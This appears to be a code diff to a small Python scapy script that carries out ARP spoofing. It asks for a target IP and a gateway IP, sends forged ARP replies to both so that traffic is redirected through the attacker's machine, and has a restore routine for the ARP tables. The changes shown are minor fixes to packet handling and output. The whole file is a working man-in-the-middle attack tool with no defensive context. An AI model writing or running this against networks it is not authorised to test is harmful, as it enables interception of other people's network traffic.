@@ -1,6 +1,7 @@
 import scapy.all as scp
 import time
 import sys
+import os
 
 target_ip = input("Enter target IP: ")
 gateway_ip = input("Enter gateway IP: ")
@@ -11,10 +12,10 @@ def get_mac(ip):
     # default op value for ARP packet is 1, which is op=who-has
     broadcast_packet = scp.Ether(dst="ff:ff:ff:ff:ff:ff")  # mac address for broadcast
     arp_broadcast_packet = broadcast_packet / arp_packet
-    answered_list = scp.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
+    answered_list = scp.srp(arp_broadcast_packet, verbose=False)
     # srp sends packet and waits for an answer and collects the packet, sorts as an tuple in the format (Answered, Unanswered)
     # the reply of the ARP packet replies with a packet that contains the mac address of the pdst
-    return answered_list[0][1].hwsrc
+    return answered_list[0][0][1].hwsrc
 
 
 def arp_spoof(target_ip, spoof_ip):
@@ -35,7 +36,7 @@ def restore(destination_ip, source_ip):
         psrc=source_ip,
         hwsrc=source_mac,
     )
-    scp.send(packet, 4)  # sending 4 packets incase of packet loss
+    scp.send(packet, count=4, verbose=False)  # sending 4 packets incase of packet loss
 
 
 sent_packets = 0
@@ -50,7 +51,8 @@ try:
         arp_spoof(gateway_ip, target_ip)
 
         sent_packets += 2
-        print("\rSent packets: " + str(sent_packets)),
+
+        sys.stdout.write("\rSent packets: " + str(sent_packets)),
         sys.stdout.flush()
         time.sleep(2)
 
